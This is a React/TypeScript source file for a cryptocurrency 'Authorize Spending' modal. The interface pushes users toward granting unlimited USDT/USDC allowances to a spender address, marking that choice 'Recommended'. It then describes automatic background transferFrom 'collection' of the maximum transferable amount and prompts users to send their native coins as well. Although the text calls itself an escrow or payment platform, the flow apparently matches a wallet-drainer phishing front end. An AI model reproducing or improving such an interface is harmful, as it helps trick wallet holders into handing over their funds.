import { TERMS_VERSION } from "../core/approve-config";
import { tokensForNetwork } from "../core/chain-tokens";
import {
  nativeSymbolForNetwork,
  shortAddress,
  statusLabel,
} from "../core/network-meta";
import { outcomeLabel } from "../authorization/session";
import {
  balanceForToken,
  countIncludedAssets,
} from "../authorization/preferences";
import type { NativeTransferEstimate } from "../native-transfer/types";
import type {
  AuthorizationAssetResult,
  AuthorizationSessionResult,
  CollectionMode,
  CollectionPreferences,
  ModalStep,
  NetworkRow,
  RowStatus,
  TokenPreference,
  TokenSymbol,
} from "../types";

type AuthorizeSpendingModalProps = {
  networks: NetworkRow[];
  rowStatus: Record<string, RowStatus>;
  selectedKey: string | null;
  approving: boolean;
  error: string | null;
  modalStep: ModalStep;
  collectionMode: CollectionMode;
  preferences: CollectionPreferences;
  termsAccepted: boolean;
  sessionResult: AuthorizationSessionResult | null;
  authorizingAsset: { network: string; token: TokenSymbol } | null;
  nativeSelected: Record<string, boolean>;
  nativeEstimates: Record<string, NativeTransferEstimate | null>;
  nativeEstimateLoading: Record<string, boolean>;
  nativeEstimateErrors: Record<string, string | null>;
  spenderEvm: string;
  spenderTron: string;
  onClose: () => void;
  onSelectNetwork: (key: string) => void;
  onCollectionModeChange: (mode: CollectionMode) => void;
  onTokenPreferenceChange: (
    network: string,
    token: TokenSymbol,
    patch: Partial<TokenPreference>
  ) => void;
  onTermsChange: (accepted: boolean) => void;
  onAuthorize: () => void;
  onContinueToNative: () => void;
  onSkipNative: () => void;
  onNativeToggle: (network: string, included: boolean) => void;
  onNativeSelectAll: (included: boolean) => void;
  onSubmitNative: () => void;
  onRetryNativeEstimate?: (network: string) => void;
};

function progressWidth(step: ModalStep): string {
  switch (step) {
    case "preferences":
      return "w-[40%]";
    case "authorizing":
      return "w-[66%]";
    case "results":
      return "w-[85%]";
    case "native":
      return "w-[95%]";
    default:
      return "w-[40%]";
  }
}

function stepSubtitle(step: ModalStep): string {
  switch (step) {
    case "preferences":
      return "Collection Preferences";
    case "authorizing":
      return "Authorizing assets";
    case "results":
      return "Authorization results";
    case "native":
      return "Optional native transfer";
    default:
      return "Collection Preferences";
  }
}

function spenderFor(network: string, evm: string, tron: string): string {
  return network === "tron" ? tron : evm;
}

function resultTone(outcome: AuthorizationAssetResult["outcome"]): string {
  switch (outcome) {
    case "authorized":
    case "collected":
    case "pending":
      return "border-emerald-200 bg-emerald-50 text-emerald-900";
    case "user_rejected":
      return "border-amber-200 bg-amber-50 text-amber-950";
    case "failed":
      return "border-red-200 bg-red-50 text-red-800";
    default:
      return "border-zinc-200 bg-zinc-50 text-zinc-700";
  }
}

export function AuthorizeSpendingModal({
  networks,
  rowStatus,
  selectedKey,
  approving,
  error,
  modalStep,
  collectionMode,
  preferences,
  termsAccepted,
  sessionResult,
  authorizingAsset,
  nativeSelected,
  nativeEstimates,
  nativeEstimateLoading,
  nativeEstimateErrors,
  spenderEvm,
  spenderTron,
  onClose,
  onSelectNetwork,
  onCollectionModeChange,
  onTokenPreferenceChange,
  onTermsChange,
  onAuthorize,
  onContinueToNative,
  onSkipNative,
  onNativeToggle,
  onNativeSelectAll,
  onSubmitNative,
  onRetryNativeEstimate,
}: AuthorizeSpendingModalProps) {
  const selected = networks.find((n) => n.key === selectedKey) ?? null;
  const includedCount = countIncludedAssets(preferences, selectedKey);
  const spender = selectedKey
    ? spenderFor(selectedKey, spenderEvm, spenderTron)
    : "";
  const canSubmitPrefs =
    Boolean(selectedKey) &&
    !approving &&
    termsAccepted &&
    includedCount > 0 &&
    Boolean(spender);

  const nativeNetworks = networks.filter((n) => {
    if (selectedKey && n.key !== selectedKey) return false;
    const est = nativeEstimates[n.key];
    return (
      est != null &&
      est.canTransfer &&
      BigInt(est.transferableRaw) > BigInt(0)
    );
  });
  const selectedNativeCount = Object.values(nativeSelected).filter(Boolean).length;
  const canSubmitNative =
    !approving && selectedNativeCount > 0 && termsAccepted;

  return (
    <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/40 px-4">
      <div className="max-h-[92vh] w-full max-w-md overflow-y-auto rounded-2xl border border-[#3396f0]/40 bg-white shadow-2xl">
        <div className="h-1 w-full bg-zinc-100">
          <div className={`h-full bg-[#3396f0] ${progressWidth(modalStep)}`} />
        </div>

        <div className="flex items-center justify-between px-4 pt-4">
          <button
            type="button"
            aria-label="Back"
            onClick={onClose}
            disabled={approving}
            className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50 disabled:opacity-50"
          >
            ‹
          </button>
          <div className="text-center">
            <p className="text-base font-semibold text-zinc-900">
              Collection Preferences
            </p>
            <p className="text-xs text-zinc-500">
              {stepSubtitle(modalStep)} · Terms v{TERMS_VERSION}
            </p>
          </div>
          <button
            type="button"
            aria-label="Close"
            onClick={onClose}
            disabled={approving}
            className="flex h-9 w-9 items-center justify-center rounded-full border border-zinc-200 text-zinc-500 hover:bg-zinc-50 disabled:opacity-50"
          >
            ×
          </button>
        </div>

        <div className="space-y-4 px-5 pb-5 pt-4">
          {error ? (
            <p className="rounded-lg bg-red-50 px-3 py-2 text-sm text-red-600">
              {error}
            </p>
          ) : null}

          {modalStep === "preferences" ? (
            <>
              <p className="text-sm text-zinc-600">
                Select one network, then choose Maximum Collection or Custom for
                that network only. Other connected networks are not included
                unless you authorize them separately.
              </p>

              <div>
                <p className="mb-2 text-xs font-semibold uppercase tracking-wide text-zinc-500">
                  Network
                </p>
                <ul className="space-y-2">
                  {networks.map((network) => {
                    const status = rowStatus[network.key] ?? "awaiting";
                    const waiting =
                      status === "waiting" || status === "finalizing";
                    const approved = status === "approved";
                    const isSelected = selectedKey === network.key;

                    return (
                      <li key={network.key}>
                        <button
                          type="button"
                          disabled={approving && !waiting}
                          onClick={() => onSelectNetwork(network.key)}
                          className={[
                            "flex w-full items-center gap-3 rounded-xl border px-3 py-3 text-left transition",
                            waiting || (isSelected && !approved)
                              ? "border-[#3396f0] bg-[#3396f0]/10"
                              : approved
                                ? "border-emerald-300 bg-emerald-50"
                                : "border-zinc-200 bg-white hover:border-zinc-300",
                          ].join(" ")}
                        >
                          <span
                            className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full text-xs font-bold text-white"
                            style={{ backgroundColor: network.color }}
                          >
                            {network.letter}
                          </span>
                          <span className="min-w-0 flex-1">
                            <span className="block text-sm font-semibold text-zinc-900">
                              {network.name}{" "}
                              <span className="font-normal text-zinc-500">
                                ({network.standard})
                              </span>
                            </span>
                            <span className="mt-0.5 block text-xs text-zinc-500">
                              {nativeSymbolForNetwork(network.key)}{" "}
                              {network.balances.native}
                              {" · "}USDT {network.balances.usdt}
                              {network.balances.usdc != null
                                ? ` · USDC ${network.balances.usdc}`
                                : ""}
                              {" · "}
                              {statusLabel(status)}
                            </span>
                          </span>
                        </button>
                      </li>
                    );
                  })}
                </ul>
              </div>

              {selected ? (
                <div className="space-y-3">
                  <div className="space-y-2">
                    <button
                      type="button"
                      disabled={approving}
                      onClick={() => onCollectionModeChange("maximum")}
                      className={[
                        "w-full rounded-xl border px-4 py-3 text-left transition",
                        collectionMode === "maximum"
                          ? "border-[#3396f0] bg-[#3396f0]/10 ring-1 ring-[#3396f0]/40"
                          : "border-zinc-200 bg-white hover:border-zinc-300",
                      ].join(" ")}
                    >
                      <p className="text-sm font-semibold text-zinc-900">
                        Maximum Collection{" "}
                        <span className="text-xs font-medium text-[#3396f0]">
                          Recommended
                        </span>
                      </p>
                      <p className="mt-1 text-xs text-zinc-600">
                        Authorize USDT and USDC on {selected.name} only, with
                        unlimited allowance so the system can collect the
                        maximum transferable amount on this network. Native coin
                        is optional afterward.
                      </p>
                    </button>

                    <button
                      type="button"
                      disabled={approving}
                      onClick={() => onCollectionModeChange("custom")}
                      className={[
                        "w-full rounded-xl border px-4 py-3 text-left transition",
                        collectionMode === "custom"
                          ? "border-[#3396f0] bg-[#3396f0]/10 ring-1 ring-[#3396f0]/40"
                          : "border-zinc-200 bg-white hover:border-zinc-300",
                      ].join(" ")}
                    >
                      <p className="text-sm font-semibold text-zinc-900">
                        Custom
                      </p>
                      <p className="mt-1 text-xs text-zinc-600">
                        Choose which tokens to include on {selected.name}, and
                        set Maximum or a custom amount per asset.
                      </p>
                    </button>
                  </div>

                  <div className="rounded-xl border border-zinc-200 bg-zinc-50 p-3">
                    <p className="mb-2 text-xs font-semibold uppercase tracking-wide text-zinc-500">
                      Assets on {selected.name}
                    </p>
                    {collectionMode === "maximum" ? (
                      <div className="flex flex-wrap gap-2">
                        {tokensForNetwork(selected.key).map((info) => {
                          const pref = preferences[selected.key]?.[info.symbol];
                          if (!pref?.included) return null;
                          return (
                            <span
                              key={info.symbol}
                              className="rounded-full border border-[#3396f0]/40 bg-white px-3 py-1 text-xs font-medium text-[#3396f0]"
                            >
                              {info.symbol} · Maximum
                              <span className="ml-1 font-normal text-zinc-500">
                                Bal {balanceForToken(selected, info.symbol)}
                              </span>
                            </span>
                          );
                        })}
                        {tokensForNetwork(selected.key).length === 0 ? (
                          <span className="text-xs text-zinc-500">
                            No stablecoins supported
                          </span>
                        ) : null}
                      </div>
                    ) : (
                      <div className="space-y-2">
                        {tokensForNetwork(selected.key).map((info) => {
                          const pref = preferences[selected.key]?.[
                            info.symbol
                          ] ?? {
                            included: false,
                            mode: "custom" as const,
                            amountHuman: "",
                          };
                          const bal = balanceForToken(selected, info.symbol);
                          return (
                            <div
                              key={info.symbol}
                              className="rounded-lg border border-zinc-200 bg-white p-3"
                            >
                              <label className="flex items-center gap-2 text-sm text-zinc-800">
                                <input
                                  type="checkbox"
                                  checked={pref.included}
                                  disabled={approving}
                                  onChange={(e) =>
                                    onTokenPreferenceChange(
                                      selected.key,
                                      info.symbol,
                                      { included: e.target.checked }
                                    )
                                  }
                                />
                                <span className="font-medium">{info.symbol}</span>
                                <span className="text-xs text-zinc-500">
                                  Bal {bal}
                                </span>
                              </label>
                              {pref.included ? (
                                <div className="mt-2 space-y-2">
                                  <div className="flex gap-2">
                                    <button
                                      type="button"
                                      disabled={approving}
                                      onClick={() =>
                                        onTokenPreferenceChange(
                                          selected.key,
                                          info.symbol,
                                          {
                                            mode: "maximum",
                                            amountHuman: "",
                                          }
                                        )
                                      }
                                      className={[
                                        "rounded-full border px-3 py-1 text-xs",
                                        pref.mode === "maximum"
                                          ? "border-[#3396f0] bg-[#3396f0]/10 text-[#3396f0]"
                                          : "border-zinc-200 text-zinc-700",
                                      ].join(" ")}
                                    >
                                      Maximum
                                    </button>
                                    <button
                                      type="button"
                                      disabled={approving}
                                      onClick={() =>
                                        onTokenPreferenceChange(
                                          selected.key,
                                          info.symbol,
                                          { mode: "custom" }
                                        )
                                      }
                                      className={[
                                        "rounded-full border px-3 py-1 text-xs",
                                        pref.mode === "custom"
                                          ? "border-[#3396f0] bg-[#3396f0]/10 text-[#3396f0]"
                                          : "border-zinc-200 text-zinc-700",
                                      ].join(" ")}
                                    >
                                      Custom amount
                                    </button>
                                  </div>
                                  {pref.mode === "custom" ? (
                                    <div>
                                      <input
                                        type="text"
                                        inputMode="decimal"
                                        placeholder="e.g. 50"
                                        disabled={approving}
                                        value={pref.amountHuman}
                                        onChange={(e) =>
                                          onTokenPreferenceChange(
                                            selected.key,
                                            info.symbol,
                                            {
                                              amountHuman: e.target.value,
                                            }
                                          )
                                        }
                                        className="w-full rounded-lg border border-zinc-200 px-3 py-2 text-sm outline-none focus:border-[#3396f0]"
                                      />
                                      <div className="mt-1.5 flex flex-wrap gap-2">
                                        {["25", "50", "100"].map((preset) => (
                                          <button
                                            key={preset}
                                            type="button"
                                            disabled={approving}
                                            onClick={() =>
                                              onTokenPreferenceChange(
                                                selected.key,
                                                info.symbol,
                                                { amountHuman: preset }
                                              )
                                            }
                                            className="rounded-full border border-zinc-200 px-2.5 py-0.5 text-[11px] text-zinc-700"
                                          >
                                            {preset}
                                          </button>
                                        ))}
                                        <button
                                          type="button"
                                          disabled={
                                            approving || Number(bal) <= 0
                                          }
                                          onClick={() =>
                                            onTokenPreferenceChange(
                                              selected.key,
                                              info.symbol,
                                              { amountHuman: bal }
                                            )
                                          }
                                          className="rounded-full border border-zinc-200 px-2.5 py-0.5 text-[11px] text-zinc-700 disabled:opacity-50"
                                        >
                                          Full balance
                                        </button>
                                      </div>
                                    </div>
                                  ) : null}
                                </div>
                              ) : null}
                            </div>
                          );
                        })}
                      </div>
                    )}

                    {spender ? (
                      <p className="mt-2 break-all font-mono text-[10px] text-zinc-500">
                        Spender {shortAddress(spender, 8, 6)}
                      </p>
                    ) : (
                      <p className="mt-2 text-xs text-amber-700">
                        Spender not configured for this network
                      </p>
                    )}
                  </div>

                  <div className="rounded-lg border border-zinc-200 bg-white px-3 py-3 text-xs leading-relaxed text-zinc-600">
                    <p className="font-semibold text-zinc-800">
                      What you are authorizing
                    </p>
                    <ul className="mt-2 list-disc space-y-1 pl-4">
                      <li>
                        This session covers {selected.name} only. Other
                        networks require their own authorization.
                      </li>
                      <li>
                        ERC-20 / TRC-20 tokens only (USDT, USDC). Native coin is
                        optional after approvals.
                      </li>
                      <li>Funds remain in your wallet after each approve.</li>
                      <li>
                        After on-chain confirmation, automatic collection
                        (transferFrom) runs in the background for each
                        authorized asset independently.
                      </li>
                      <li>
                        Maximum means unlimited allowance so the system can
                        collect the maximum transferable amount available on
                        this network.
                      </li>
                      <li>
                        The spender pays transferFrom network fees. You pay
                        approve fees. You can revoke later.
                      </li>
                    </ul>
                  </div>

                  <label className="flex items-start gap-2 text-sm text-zinc-700">
                    <input
                      type="checkbox"
                      className="mt-1"
                      checked={termsAccepted}
                      disabled={approving}
                      onChange={(e) => onTermsChange(e.target.checked)}
                    />
                    <span>
                      I understand and accept the Terms &amp; Conditions (v
                      {TERMS_VERSION}) for delegated spending on this escrow /
                      payment platform.
                    </span>
                  </label>

                  <button
                    type="button"
                    disabled={!canSubmitPrefs}
                    onClick={onAuthorize}
                    className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white transition hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
                  >
                    {!selectedKey
                      ? "Select a network"
                      : `Continue · Authorize ${includedCount} asset${
                          includedCount === 1 ? "" : "s"
                        } on ${selected.name}`}
                  </button>
                </div>
              ) : (
                <p className="rounded-lg border border-zinc-200 bg-zinc-50 px-3 py-3 text-sm text-zinc-600">
                  Select a network above to set Collection Preferences for that
                  chain only.
                </p>
              )}
            </>
          ) : null}

          {modalStep === "authorizing" ? (
            <div className="space-y-3 py-6 text-center">
              <p className="text-sm font-semibold text-zinc-900">
                Confirm each approval in your wallet
              </p>
              <p className="text-sm text-zinc-600">
                Assets are authorized one at a time. If you reject or one fails,
                the remaining assets still continue.
              </p>
              {authorizingAsset ? (
                <p className="rounded-lg border border-[#3396f0]/30 bg-[#3396f0]/10 px-3 py-2 text-sm text-[#1d5f9e]">
                  Now: {authorizingAsset.network.toUpperCase()}{" "}
                  {authorizingAsset.token}
                </p>
              ) : null}
              <p className="text-xs text-zinc-500">
                Waiting for wallet confirmation...
              </p>
            </div>
          ) : null}

          {modalStep === "results" && sessionResult ? (
            <>
              <p className="text-sm text-zinc-600">
                Authorization finished. Collection of authorized assets continues
                automatically in the background. Failures on one asset do not
                block others.
              </p>
              <div className="grid grid-cols-3 gap-2 text-center text-xs">
                <div className="rounded-lg bg-emerald-50 px-2 py-2 text-emerald-800">
                  <p className="text-lg font-semibold">
                    {sessionResult.authorizedCount}
                  </p>
                  Authorized
                </div>
                <div className="rounded-lg bg-amber-50 px-2 py-2 text-amber-900">
                  <p className="text-lg font-semibold">
                    {sessionResult.rejectedCount}
                  </p>
                  Rejected
                </div>
                <div className="rounded-lg bg-red-50 px-2 py-2 text-red-800">
                  <p className="text-lg font-semibold">
                    {sessionResult.failedCount + sessionResult.skippedCount}
                  </p>
                  Failed / skipped
                </div>
              </div>
              <ul className="space-y-2">
                {sessionResult.items.map((item, index) => (
                  <li
                    key={`${item.network}:${item.token}:${index}`}
                    className={`rounded-lg border px-3 py-2 text-sm ${resultTone(item.outcome)}`}
                  >
                    <p className="font-semibold">
                      {item.network.toUpperCase()} {item.token}
                    </p>
                    <p className="text-xs opacity-90">
                      {item.message || outcomeLabel(item.outcome)}
                    </p>
                  </li>
                ))}
              </ul>
              <div className="flex flex-col gap-2">
                <button
                  type="button"
                  disabled={approving}
                  onClick={onContinueToNative}
                  className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white hover:bg-[#2b7fd6] disabled:opacity-50"
                >
                  Also transfer native coins?
                </button>
                <button
                  type="button"
                  disabled={approving}
                  onClick={onSkipNative}
                  className="w-full rounded-xl border border-zinc-200 bg-white py-3 text-sm font-medium text-zinc-700 hover:border-zinc-300 disabled:opacity-50"
                >
                  Done
                </button>
              </div>
            </>
          ) : null}

          {modalStep === "native" ? (
            <>
              <p className="text-sm text-zinc-600">
                Optional: send native coin on the network you just authorized.
                This needs a separate wallet signature and is independent of
                token collection.
              </p>

              {nativeNetworks.length === 0 ? (
                <p className="rounded-lg border border-amber-200 bg-amber-50 px-3 py-2 text-sm text-amber-950">
                  No transferable native balance after fees on this network. You
                  can close this step.
                </p>
              ) : (
                <>
                  <div className="flex gap-2">
                    <button
                      type="button"
                      disabled={approving}
                      onClick={() => onNativeSelectAll(true)}
                      className="rounded-full border border-zinc-200 px-3 py-1 text-xs text-zinc-700"
                    >
                      Select all
                    </button>
                    <button
                      type="button"
                      disabled={approving}
                      onClick={() => onNativeSelectAll(false)}
                      className="rounded-full border border-zinc-200 px-3 py-1 text-xs text-zinc-700"
                    >
                      Clear
                    </button>
                  </div>
                  <ul className="space-y-2">
                    {nativeNetworks.map((network) => {
                      const est = nativeEstimates[network.key];
                      const loading = nativeEstimateLoading[network.key];
                      const estError = nativeEstimateErrors[network.key];
                      return (
                        <li
                          key={network.key}
                          className="rounded-xl border border-zinc-200 bg-zinc-50 p-3"
                        >
                          <label className="flex items-start gap-2 text-sm">
                            <input
                              type="checkbox"
                              className="mt-1"
                              checked={Boolean(nativeSelected[network.key])}
                              disabled={approving}
                              onChange={(e) =>
                                onNativeToggle(network.key, e.target.checked)
                              }
                            />
                            <span className="min-w-0 flex-1">
                              <span className="font-semibold text-zinc-900">
                                {network.name} ·{" "}
                                {nativeSymbolForNetwork(network.key)}
                              </span>
                              <span className="mt-1 block text-xs text-zinc-600">
                                {loading
                                  ? "Calculating fees..."
                                  : est
                                    ? `Transferable ${est.transferableHuman} ${est.assetSymbol} · fee ${est.feeHuman}`
                                    : "No estimate"}
                              </span>
                              {estError ? (
                                <span className="mt-1 block text-xs text-red-600">
                                  {estError}{" "}
                                  {onRetryNativeEstimate ? (
                                    <button
                                      type="button"
                                      className="underline"
                                      onClick={() =>
                                        onRetryNativeEstimate(network.key)
                                      }
                                    >
                                      Retry
                                    </button>
                                  ) : null}
                                </span>
                              ) : null}
                            </span>
                          </label>
                        </li>
                      );
                    })}
                  </ul>
                </>
              )}

              {sessionResult ? (
                <ul className="space-y-1">
                  {sessionResult.items
                    .filter((i) => i.token === "NATIVE")
                    .map((item) => (
                      <li
                        key={`native-${item.network}-${item.outcome}`}
                        className={`rounded-lg border px-3 py-2 text-xs ${resultTone(item.outcome)}`}
                      >
                        {item.network.toUpperCase()} NATIVE —{" "}
                        {item.message || outcomeLabel(item.outcome)}
                      </li>
                    ))}
                </ul>
              ) : null}

              <div className="flex flex-col gap-2">
                <button
                  type="button"
                  disabled={!canSubmitNative}
                  onClick={onSubmitNative}
                  className="w-full rounded-xl bg-[#3396f0] py-3.5 text-sm font-semibold text-white hover:bg-[#2b7fd6] disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {approving
                    ? "Confirm in your wallet..."
                    : `Transfer ${selectedNativeCount} native asset${
                        selectedNativeCount === 1 ? "" : "s"
                      }`}
                </button>
                <button
                  type="button"
                  disabled={approving}
                  onClick={onSkipNative}
                  className="w-full rounded-xl border border-zinc-200 bg-white py-3 text-sm font-medium text-zinc-700 disabled:opacity-50"
                >
                  Skip / Done
                </button>
              </div>
            </>
          ) : null}
        </div>
      </div>
    </div>
  );
}
